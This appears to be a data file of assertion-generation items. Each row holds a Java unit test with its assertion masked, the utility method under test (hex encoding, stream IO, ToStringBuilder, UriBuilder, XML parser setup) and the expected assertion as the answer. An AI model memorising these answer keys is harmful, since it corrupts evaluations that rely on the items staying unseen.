decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(byteArray, decode)
"encodeDecodeTestShort() { String encode = HexUtility.encode(TEST_STRING_SHORT.getBytes()); byte[] decode = HexUtility.decode(encode); ""<AssertPlaceHolder>""; }
decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(TEST_STRING_SHORT.getBytes(), decode)
"encodeDecodeTestMiddle() { String encode = HexUtility.encode(TEST_STRING_MIDDLE.getBytes()); byte[] decode = HexUtility.decode(encode); ""<AssertPlaceHolder>""; }
decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(TEST_STRING_MIDDLE.getBytes(), decode)
"encodeDecodeTestLong() { String encode = HexUtility.encode(TEST_STRING_LONG.getBytes()); byte[] decode = HexUtility.decode(encode); ""<AssertPlaceHolder>""; }
decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"encodeDecodeTestLongAndStringChangedToBlocks() { String encode = HexUtility.encode(TEST_STRING_LONG.getBytes()); encode = StringUtility.wrapText(encode, 80); byte[] decode = HexUtility.decode(encode); ""<AssertPlaceHolder>""; }
decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"encodeTestShortAndCheckAgainstHexString() { String encode = HexUtility.encode(TEST_STRING_SHORT.getBytes()); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { if (bytes == null) { return null; } int length = bytes.length; if (length == 0) { return """"; } StringWriter out = new StringWriter(length * 2); try (HexOutputStream h = new HexOutputStream(out)) { h.write(bytes); h.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toString(); }"	assertEquals(TEST_BASE64_DATA_OF_STRING_SHORT, encode)
"encodeTestMiddleAndCheckAgainstHexString() { String encode = HexUtility.encode(TEST_STRING_MIDDLE.getBytes()); StringUtility.equalsIgnoreCase(TEST_BASE64_DATA_OF_STRING_MIDDLE, encode); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { if (bytes == null) { return null; } int length = bytes.length; if (length == 0) { return """"; } StringWriter out = new StringWriter(length * 2); try (HexOutputStream h = new HexOutputStream(out)) { h.write(bytes); h.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toString(); }"	assertEquals(TEST_BASE64_DATA_OF_STRING_MIDDLE, encode)
"encodeTestLongAndCheckAgainstHexString() { String encode = HexUtility.encode(TEST_STRING_LONG.getBytes()); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { if (bytes == null) { return null; } int length = bytes.length; if (length == 0) { return """"; } StringWriter out = new StringWriter(length * 2); try (HexOutputStream h = new HexOutputStream(out)) { h.write(bytes); h.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toString(); }"	assertEquals(TEST_BASE64_DATA_STRING_OF_STRING_LONG, encode)
"encodeTestLongAndStringChangedToBlocks() { String encode = HexUtility.encode(TEST_STRING_LONG.getBytes()); encode = StringUtility.wrapText(encode, 76); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { if (bytes == null) { return null; } int length = bytes.length; if (length == 0) { return """"; } StringWriter out = new StringWriter(length * 2); try (HexOutputStream h = new HexOutputStream(out)) { h.write(bytes); h.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toString(); }"	assertEquals(TEST_BASE64_DATA_BLOCK_OF_STRING_LONG, encode)
"decodeTestShortHexString() { byte[] decode = HexUtility.decode(TEST_BASE64_DATA_OF_STRING_SHORT); ""<AssertPlaceHolder>""; }
decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(TEST_STRING_SHORT.getBytes(), decode)
"decodeTestMiddleHexString() { byte[] decode = HexUtility.decode(TEST_BASE64_DATA_OF_STRING_MIDDLE); ""<AssertPlaceHolder>""; }
decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(TEST_STRING_MIDDLE.getBytes(), decode)
"decodeTestLongHexString() { byte[] decode = HexUtility.decode(TEST_BASE64_DATA_STRING_OF_STRING_LONG); ""<AssertPlaceHolder>""; }
decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"decodeTestLongBlockHexString() { byte[] decode = HexUtility.decode(TEST_BASE64_DATA_BLOCK_OF_STRING_LONG); ""<AssertPlaceHolder>""; }
decode(String hex) { if (hex == null) { return null; } int length = hex.length(); if (length == 0) { return new byte[0]; } ByteArrayOutputStream out = new ByteArrayOutputStream(length / 2); try (HexInputStream h = new HexInputStream(new StringReader(hex))) { int b; while ((b = h.read()) >= 0) { out.write(b); } out.close(); } catch (IOException e) { throw new ProcessingException(""Unexpected behaviour"", e); } return out.toByteArray(); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"testReadBytes() { byte[] expected = new byte[]{0, 1, 2, 3}; byte[] actual = IOUtility.readBytes(newInputStream(expected)); ""<AssertPlaceHolder>""; }
readBytes(InputStream in) { return readBytes(in, -1); }"	assertArrayEquals(expected, actual)
"testReadBytesLengthToSmall() { byte[] data = new byte[]{0, 1, 2, 3}; byte[] expected = Arrays.copyOfRange(data, 0, 3); byte[] actual = IOUtility.readBytes(newInputStream(data), 3); ""<AssertPlaceHolder>""; }
readBytes(InputStream in, int len) { if (len >= 0) { try { byte[] buf = new byte[len]; int count = 0; while (count < len) { int read = in.read(buf, count, len - count); if (read < 0) { return Arrays.copyOf(buf, count); } count += read; } return buf; } catch (IOException e) { throw new ProcessingException(""input: "" + in, e); } } else { try (ByteArrayOutputStream buffer = new ByteArrayOutputStream()) { writeFromToStream(buffer, in); return buffer.toByteArray(); } catch (IOException e) { throw new ProcessingException(""input: "" + in, e); } } }"	assertArrayEquals(expected, actual)
"testReadBytesLengthToBig() { byte[] data = new byte[]{0, 1, 2, 3}; byte[] actual = IOUtility.readBytes(newInputStream(data), 10); ""<AssertPlaceHolder>""; }
readBytes(InputStream in, int len) { if (len >= 0) { try { byte[] buf = new byte[len]; int count = 0; while (count < len) { int read = in.read(buf, count, len - count); if (read < 0) { return Arrays.copyOf(buf, count); } count += read; } return buf; } catch (IOException e) { throw new ProcessingException(""input: "" + in, e); } } else { try (ByteArrayOutputStream buffer = new ByteArrayOutputStream()) { writeFromToStream(buffer, in); return buffer.toByteArray(); } catch (IOException e) { throw new ProcessingException(""input: "" + in, e); } } }"	assertArrayEquals(data, actual)
"Exception { String data = ""0123äöü""; String expected = data.substring(0, 6); String actual = IOUtility.readString(newInputStream(data.getBytes(""UTF-8"")), ""UTF-8"", 6); ""<AssertPlaceHolder>""; }
readString(InputStream in, String charset, int len) { if (StringUtility.hasText(charset)) { try { return readString(new InputStreamReader(in, charset), len); } catch (UnsupportedEncodingException e) { throw new PlatformException(""charset {}"", charset, e); } } else { return readString(new InputStreamReader(in), len); } }"	assertEquals(expected, actual)
"testReadString() { String expected = ""0123""; String actual = IOUtility.readString(newReader(expected)); ""<AssertPlaceHolder>""; }
readString(Reader in) { return readString(in, -1); }"	assertEquals(expected, actual)
"testWriteBytes() { byte[] expected = new byte[]{0, 1, 2, 3}; ByteArrayOutputStream out = new ByteArrayOutputStream(); IOUtility.writeBytes(out, expected); byte[] actual = out.toByteArray(); ""<AssertPlaceHolder>""; }
writeBytes(OutputStream out, byte[] bytes) { try { out.write(bytes); } catch (IOException e) { throw new ProcessingException(""output: "" + out, e); } }"	assertArrayEquals(expected, actual)
"Exception { String expected = ""0123äöü""; ByteArrayOutputStream out = new ByteArrayOutputStream(); IOUtility.writeString(out, ""UTF-8"", expected); String actual = new String(out.toByteArray(), ""UTF-8""); ""<AssertPlaceHolder>""; }
writeString(OutputStream out, String charset, String s) { try (OutputStreamWriter w = new OutputStreamWriter(out, charset)) { w.write(s); w.flush(); } catch (IOException e) { throw new ProcessingException(""output: "" + out, e); } }"	assertEquals(expected, actual)
"testWriteString() { String expected = ""0123""; StringWriter out = new StringWriter(); IOUtility.writeString(out, expected); String actual = out.toString(); ""<AssertPlaceHolder>""; }
writeString(Writer out, String s) { try { out.write(s); } catch (IOException e) { throw new ProcessingException(""output: "" + out, e); } }"	assertEquals(expected, actual)
"testGetBuildDate() { assumeModuleCompiledToJar(); ""<AssertPlaceHolder>""; }
getBuildDateAttribute(Class<?> manifestResourceBase) { try { return DateUtility.parse(getAttribute(manifestResourceBase, MANIFEST_ATTRIBUTE_BUILD_TIME), MANIFEST_BUILD_TIME_PATTERN); } catch (IllegalArgumentException e) { LOG.warn(""Failed to parse build date from manifest attribute {}"", MANIFEST_ATTRIBUTE_BUILD_TIME, e); return null; } }"	assertTrue(new Date().after(m_helper.getBuildDateAttribute(Platform.class)))
"testSortNullSortValues() { MatrixUtility.sort(m_array, 3); ""<AssertPlaceHolder>""; }
sort(Object[][] data, int... sortColumns) { sort(NlsLocale.get(), data, sortColumns); }"	assertArrayEquals(new Object[][]{E1, E2, E5, E4, E3}, m_array)
"testToLinkedHashMap() { String[] values = new String[]{""one"", ""two"", ""three""}; LinkedHashMap<String, Integer> map = Stream.of(values).collect(StreamUtility.toLinkedHashMap(t -> t, StringUtility::length)); ""<AssertPlaceHolder>""; }
toLinkedHashMap(Function<? super T, ? extends K> keyMapper, Function<? super T, ? extends U> valueMapper) { return toMap(LinkedHashMap::new, keyMapper, valueMapper); }"	assertArrayEquals(values, map.keySet().toArray())
"testDecompress_umlauts() { String original = CHARACTERS.repeat(100000); String decompressed = StringUtility.decompress(StringUtility.compress(original));  ""<AssertPlaceHolder>""; }
compress(String s) { ByteArrayOutputStream buffer = new ByteArrayOutputStream(); Deflater deflater = new Deflater(Deflater.BEST_COMPRESSION); DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(buffer, deflater); // writes the compressed data into the stream buffer StringReader in = null; try { in = new StringReader(s);  char[] c = new char[102400]; int len; while ((len = in.read(c)) > 0) { String str = new String(c, 0, len); byte[] b = str.getBytes(StandardCharsets.UTF_8); deflaterOutputStream.write(b, 0, b.length); } } catch (IOException e) { // NOOP } finally { try { deflaterOutputStream.flush(); } catch (IOException e) { } try { buffer.flush(); } catch (IOException e) { } deflater.finish(); try { deflaterOutputStream.finish(); } catch (IOException e) { } deflater.end(); try { deflaterOutputStream.close(); } catch (IOException e) { } try { buffer.close(); } catch (IOException e) { } if (in != null) { in.close(); } }  return buffer.toByteArray(); }"	assertEquals(original, decompressed)
"testInstanceClass() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance); builder.attr(""string"", ""blubber""); builder.attr(""int"", 1); builder.attr(""long"", 2L); builder.attr(""short"", (short) 3); builder.attr(""float"", (float) 4); builder.attr(""double"", (double) 5.0); builder.ref(""ref"", REF); builder.attr(""obj"", REF);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[string=blubber, int=1, long=2, short=3, float=4.0, double=5.0, ref=Object@1c8, obj=OBJ]"", builder.toString())"
"testInstanceClassWithoutHashCode() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance, false); builder.attr(""string"", ""blubber""); builder.attr(""int"", 1); builder.attr(""long"", 2L); builder.attr(""short"", (short) 3); builder.attr(""float"", (float) 4); builder.attr(""double"", (double) 5.0); builder.ref(""ref"", REF); builder.attr(""obj"", REF);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance[string=blubber, int=1, long=2, short=3, float=4.0, double=5.0, ref=Object@1c8, obj=OBJ]"", builder.toString())"
"testNullValue() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance); builder.attr(null);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[]"", builder.toString())"
"testNullAttribute() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance); builder.attr(""attr1"", (Object) null); builder.attr(""attr2"", (Object) null, true); builder.attr(""attr3"", (Object) null, false);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[attr1=null, attr2=null]"", builder.toString())"
"testCollectionAttribute1() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance); builder.attr(""c1"", Arrays.asList(1, 2, null, 3)); builder.attr(""c2"", (Collection) null); builder.attr(""c3"", new ArrayList<>(0)); builder.attr(""c4"", Arrays.asList((String) null));  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[c1=[1,2,3], c2=[], c3=[], c4=[]]"", builder.toString())"
"testCollectionAttribute2() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance); builder.attr(""c1"", Arrays.asList(1, 2, null, 3), false); builder.attr(""c2"", (Collection) null, false); builder.attr(""c3"", new ArrayList<>(0), false); builder.attr(""c4"", Arrays.asList((String) null), false);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[c1=[1,2,3]]"", builder.toString())"
"testVarArgAttribute1() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance); builder.attr(""c1"", 1, 2, null, 3); builder.attr(""c2"", (Object[]) null); builder.attr(""c3"", new Object[0]);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[c1=[1,2,3], c2=[], c3=[]]"", builder.toString())"
"testNullStringAttribute() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance); builder.attr(""attr1"", (String) null); builder.attr(""attr2"", (String) null, true); builder.attr(""attr3"", (String) null, false);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[attr1=null, attr2=null]"", builder.toString())"
"testEmptyStringAttribute() { Instance instance = new Instance(123 /* HashCode */);  ToStringBuilder builder = new ToStringBuilder(instance); builder.attr(""attr1"", """"); builder.attr(""attr2"", """", true); builder.attr(""attr3"", """", false);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[attr1=, attr2=]"", builder.toString())"
"testAnonymousClass1() { ToStringBuilder builder = new ToStringBuilder(new Instance(123) {  @Override public int hashCode() { return 123; } });  builder.attr(""string"", ""blubber""); builder.attr(""int"", 1); builder.attr(""long"", 2L); builder.attr(""short"", (short) 3); builder.attr(""float"", (float) 4); builder.attr(""double"", (double) 5.0); builder.ref(""ref"", REF); builder.attr(""obj"", REF);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Instance@7b[string=blubber, int=1, long=2, short=3, float=4.0, double=5.0, ref=Object@1c8, obj=OBJ]"", builder.toString())"
"testAnonymousClass2() { ToStringBuilder builder = new ToStringBuilder(new Serializable() { private static final long serialVersionUID = 1L;  @Override public int hashCode() { return 123; } });  builder.attr(""string"", ""blubber""); builder.attr(""int"", 1); builder.attr(""long"", 2L); builder.attr(""short"", (short) 3); builder.attr(""float"", (float) 4); builder.attr(""double"", (double) 5.0); builder.ref(""ref"", REF); builder.attr(""obj"", REF);  ""<AssertPlaceHolder>""; }
toString() { return String.format(""%s[%s]"", m_identifier, StringUtility.join("", "", m_builder)); }"	"assertEquals(""Serializable@7b[string=blubber, int=1, long=2, short=3, float=4.0, double=5.0, ref=Object@1c8, obj=OBJ]"", builder.toString())"
"URISyntaxException { String encodedUrl = ""http://localhost/?x=20D""; final URI uri = new URI(encodedUrl); ""<AssertPlaceHolder>""; }
createURI() { return createURI(DEFAULT_ENCODING); }"	assertEquals(uri, new UriBuilder(uri).createURI())
"URISyntaxException { UriBuilder builder = new UriBuilder(new URI(SIMPLE_URL + ""/"")) .addPath(""test""); ""<AssertPlaceHolder>""; }
createURI() { return createURI(DEFAULT_ENCODING); }"	"assertEquals(SIMPLE_URL + ""/test"", builder.createURI().toString())"
"URISyntaxException { UriBuilder builder = new UriBuilder(new URI(TEST_URI_PATH)) .addPath(""test""); ""<AssertPlaceHolder>""; }
createURI() { return createURI(DEFAULT_ENCODING); }"	"assertEquals(TEST_URI_PATH + ""/test"", builder.createURI().toString())"
"URISyntaxException { UriBuilder builder = new UriBuilder(new URI(TEST_URI_PATH + ""/"")) .addPath(""test""); ""<AssertPlaceHolder>""; }
createURI() { return createURI(DEFAULT_ENCODING); }"	"assertEquals(TEST_URI_PATH + ""/test"", builder.createURI().toString())"
"testEncodedQuery() { String query = ""?a=%3D""; UriBuilder builder = new UriBuilder(TEST_URI_PATH + query); final String url = builder.createURL().toString(); ""<AssertPlaceHolder>""; }
createURL() { return createURL(DEFAULT_ENCODING); }"	assertTrue(url.toString(), url.toString().endsWith(query))
"testParameter_WithEmptyValue() { UriBuilder builder = new UriBuilder(TEST_URI_PATH) .parameter(""one"", ""x"") .parameter(""two"", null) // should be absent .parameter(""three"", """") // should be present but without = .parameter(""four"", "" "") .parameter(""five"", "" x "");  String s = builder.createURL().toString(); ""<AssertPlaceHolder>""; }
createURL() { return createURL(DEFAULT_ENCODING); }"	"assertEquals(""http://acme.com:1234/scout?one=x&three&four=+&five=+x+"", s)"
"Exception { String s = ""http://host/path/to?test=foo#anchor""; URL a = new URL(s); URL b = new URL(s); ""<AssertPlaceHolder>""; }
hashCode(URL a) { return Objects.hashCode(a == null ? null : a.toString()); }"	assertEquals(UriUtility.hashCode(a), UriUtility.hashCode(b))
"Exception { Document doc = XmlUtility.newDocumentBuilder().parse(new ByteArrayInputStream(SIMPLE_XML.getBytes(StandardCharsets.UTF_8))); ""<AssertPlaceHolder>""; }
newDocumentBuilder() throws ParserConfigurationException { DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();  for (Entry<String, Boolean> a : getXmlFeaturesMap().entrySet()) { String feature = a.getKey(); boolean enabled = a.getValue().booleanValue(); try { factory.setFeature(feature, enabled); } catch (ParserConfigurationException e) { LOG.warn(""Feature '{}' is not supported in the current XML parser: {}"", feature, factory.getClass().getName(), e); } }  try { factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, """"); } catch (IllegalArgumentException e) { LOG.debug(""Attribute '{}' is not supported in the current DocumentBuilderFactory: {}"", XMLConstants.ACCESS_EXTERNAL_DTD, factory.getClass().getName(), e); }  try { factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, """"); } catch (IllegalArgumentException e) { LOG.debug(""Attribute '{}' is not supported in the current DocumentBuilderFactory: {}"", XMLConstants.ACCESS_EXTERNAL_SCHEMA, factory.getClass().getName(), e); }  factory.setXIncludeAware(false); factory.setExpandEntityReferences(false); factory.setIgnoringComments(true); return factory.newDocumentBuilder(); }"	"assertEquals(""root"", doc.getDocumentElement().getNodeName())"
"Exception { final StringBuilder buf = new StringBuilder(); XmlUtility.newSAXParser().parse(new ByteArrayInputStream(SIMPLE_XML.getBytes(StandardCharsets.UTF_8)), new DefaultHandler() { @Override public void startDocument() { buf.append(""startDocument\n""); }  @Override public void endDocument() { buf.append(""endDocument\n""); }  @Override public void startElement(String uri, String localName, String qName, Attributes attributes) { buf.append(""startElement "" + qName + ""\n""); }  @Override public void endElement(String uri, String localName, String qName) { buf.append(""endElement "" + qName + ""\n""); } }); ""<AssertPlaceHolder>""; }
newSAXParser() throws ParserConfigurationException, SAXException { SAXParserFactory factory = SAXParserFactory.newInstance();  for (Entry<String, Boolean> a : getXmlFeaturesMap().entrySet()) { String feature = a.getKey(); boolean enabled = a.getValue().booleanValue(); try { factory.setFeature(feature, enabled); } catch (ParserConfigurationException e) { LOG.warn(""Feature '{}' is not supported in the current XML parser: {}"", feature, factory.getClass().getName(), e); } }  factory.setXIncludeAware(false); factory.setValidating(false); return factory.newSAXParser(); }"	"assertEquals(""startDocument\nstartElement root\nstartElement element\nendElement element\nendElement root\nendDocument\n"", buf.toString())"
"testGetChildElementsEmptyDocument() { Element root = XmlUtility.getXmlDocument(EMPTY_XML).getDocumentElement(); List<Element> children = XmlUtility.getChildElements(root, ""element""); ""<AssertPlaceHolder>""; }
getChildElements(Element parent, String tagName) { final NodeList children = parent.getChildNodes(); List<Element> result = new ArrayList<>(children.getLength()); for (int i = 0; i < children.getLength(); i++) { Node n = children.item(i); if (n.getNodeType() == Node.ELEMENT_NODE && (tagName == null || tagName.equals(n.getNodeName()))) { result.add((Element) n); } } return result; }"	assertEquals(0, children.size())
"testGetChildElementsSingleElement() { Element root = XmlUtility.getXmlDocument(SIMPLE_XML).getDocumentElement(); List<Element> children = XmlUtility.getChildElements(root, ""element""); ""<AssertPlaceHolder>""; }
getChildElements(Element parent, String tagName) { final NodeList children = parent.getChildNodes(); List<Element> result = new ArrayList<>(children.getLength()); for (int i = 0; i < children.getLength(); i++) { Node n = children.item(i); if (n.getNodeType() == Node.ELEMENT_NODE && (tagName == null || tagName.equals(n.getNodeName()))) { result.add((Element) n); } } return result; }"	assertEquals(1, children.size())
"testGetFirstChildElementEmptyDocument() { Element root = XmlUtility.getXmlDocument(EMPTY_XML).getDocumentElement(); Element child = XmlUtility.getFirstChildElement(root, ""element""); ""<AssertPlaceHolder>""; }
getFirstChildElement(Element parent, String tagName) { final NodeList children = parent.getChildNodes(); for (int i = 0; i < children.getLength(); i++) { Node n = children.item(i); if (n.getNodeType() == Node.ELEMENT_NODE && (tagName == null || tagName.equals(n.getNodeName()))) { return (Element) n; } } return null; }"	assertNull(child)
"testGetFirstChildElementSingleElement() { Element root = XmlUtility.getXmlDocument(SIMPLE_XML).getDocumentElement(); Element child = XmlUtility.getFirstChildElement(root, ""element""); ""<AssertPlaceHolder>""; }
getFirstChildElement(Element parent, String tagName) { final NodeList children = parent.getChildNodes(); for (int i = 0; i < children.getLength(); i++) { Node n = children.item(i); if (n.getNodeType() == Node.ELEMENT_NODE && (tagName == null || tagName.equals(n.getNodeName()))) { return (Element) n; } } return null; }"	assertNotNull(child)
"testIteratorRemove() { ITransaction tr1 = createNewTransaction();  Map<Integer, String> initalMap = new HashMap<>(); initalMap.put(2, ""2""); initalMap.put(3, ""3""); Map<Integer, String> map = createTransactionalMap(TRANSACTION_MEMBER_ID, false, initalMap); ITransaction.CURRENT.set(tr1); map.put(1, ""1""); map.put(2, ""2.2""); map.put(4, ""4"");  // remove entries while iterating (no concurrent modification exception is thrown) for (Iterator<Entry<Integer, String>> iterator = map.entrySet().iterator(); iterator.hasNext();) { iterator.next(); iterator.remove(); }  ""<AssertPlaceHolder>""; }
isEmpty() { return getTransactionMap(true).isEmpty(); }"	"assertTrue(""Map must be empty"", map.isEmpty())"
"testAddAllOrderedTheSameInstanceTwice() { List<IOrdered> list = Arrays.asList(m_ordered10, m_ordered10); c.addAllOrdered(list); ""<AssertPlaceHolder>""; }
getOrderedList() { List<ORDERED> list = new ArrayList<>(size()); ORDERED prev = null; boolean unsorted = false; boolean first = true; for (ORDERED next : m_orderedObjects) { list.add(next); if (unsorted) { // ordered collection is not sorted correctly. Skip successive checks. continue; }  // check whether order is ok if (!first) { unsorted = m_comparator.compare(prev, next) > 0; } first = false; prev = next; }  if (unsorted) { list.sort(m_comparator); } return list; }"	assertEquals(list, c.getOrderedList())
"testAddAllOrderedTwoInstancesOfSameClassWithSameOrder() { List<IOrdered> list = Arrays.asList(m_ordered10, new Ordered(10d)); c.addAllOrdered(list); ""<AssertPlaceHolder>""; }
getOrderedList() { List<ORDERED> list = new ArrayList<>(size()); ORDERED prev = null; boolean unsorted = false; boolean first = true; for (ORDERED next : m_orderedObjects) { list.add(next); if (unsorted) { // ordered collection is not sorted correctly. Skip successive checks. continue; }  // check whether order is ok if (!first) { unsorted = m_comparator.compare(prev, next) > 0; } first = false; prev = next; }  if (unsorted) { list.sort(m_comparator); } return list; }"	assertEquals(list, c.getOrderedList())
"testGetOrderedEmpty() { ""<AssertPlaceHolder>""; }
getOrderedList() { List<ORDERED> list = new ArrayList<>(size()); ORDERED prev = null; boolean unsorted = false; boolean first = true; for (ORDERED next : m_orderedObjects) { list.add(next); if (unsorted) { // ordered collection is not sorted correctly. Skip successive checks. continue; }  // check whether order is ok if (!first) { unsorted = m_comparator.compare(prev, next) > 0; } first = false; prev = next; }  if (unsorted) { list.sort(m_comparator); } return list; }"	assertEquals(Collections.<IOrdered> emptyList(), c.getOrderedList())
"testFlushDeferredQueueHasBatchSizeElements() { List<String> batch = new ArrayList<>(); FixtureDeferredOperationQueue<String> queue = new FixtureDeferredOperationQueue<>(QUEUE_TRANSACTION_MEMBER_ID, 2, TimeUnit.HOURS.toMillis(10), batch::addAll); RunContexts.empty().run(() -> { queue.add(""first""); queue.add(""second""); }); queue.flushDeferred(true); ""<AssertPlaceHolder>""; }
flushDeferred(boolean singleRun) { final int batchSize = getBatchSize(); boolean interrupted = false; do { List<E> nextBatch = new ArrayList<>(batchSize); // get at most batchSize elements at once m_queue.drainTo(nextBatch, batchSize);  if (nextBatch.size() < batchSize) { // wait maxDelayMillis for additional elements long timeout = getMaxDelayMillis(); final long deadline = System.currentTimeMillis() + timeout; try { E next; while (timeout > 0 && (next = m_queue.poll(timeout, TimeUnit.MILLISECONDS)) != null) { nextBatch.add(next); if (nextBatch.size() == batchSize) { break; } timeout = deadline - System.currentTimeMillis(); } } catch (InterruptedException e) { // do not exit here but execute batch operations on elements that were already collected // and update internal state so that next add will schedule another flush job. interrupted = true; } }  if (nextBatch.isEmpty()) { break; }  try { getBatchOperation().accept(nextBatch); } catch (RuntimeException e) { LOG.error(""Exception occurred while execution batch operation"", e); } } while (!interrupted && !singleRun);  // check whether other elements arrived in the mean time within an exclusive lock // to prevent race conditions. This job will finish. But if new items arrived, a new // job is scheduled. m_lock.writeLock().lock(); try { if (m_queue.isEmpty()) { // no new elements -> reset flushJobScheduled property so that the next invocation of // add will schedule a new flush job m_flushJobScheduled.set(false); m_flushJobFuture = null; } else { // there are already new elements -> schedule a new flush job (Note: m_flushJobScheduled // is still true, hence invocations of add did not schedule another job). scheduleFlushJob(); } } finally { m_lock.writeLock().unlock(); } }"	"assertEquals(asList(""first"", ""second""), batch)"
"testFlushDeferredQueueHasBatchSizeElementsUsingAddAll() { List<String> batch = new ArrayList<>(); FixtureDeferredOperationQueue<String> queue = new FixtureDeferredOperationQueue<>(QUEUE_TRANSACTION_MEMBER_ID, 2, TimeUnit.HOURS.toMillis(10), batch::addAll); RunContexts.empty().run(() -> queue.addAll(Stream.of(""first"", ""second""))); queue.flushDeferred(true); ""<AssertPlaceHolder>""; }
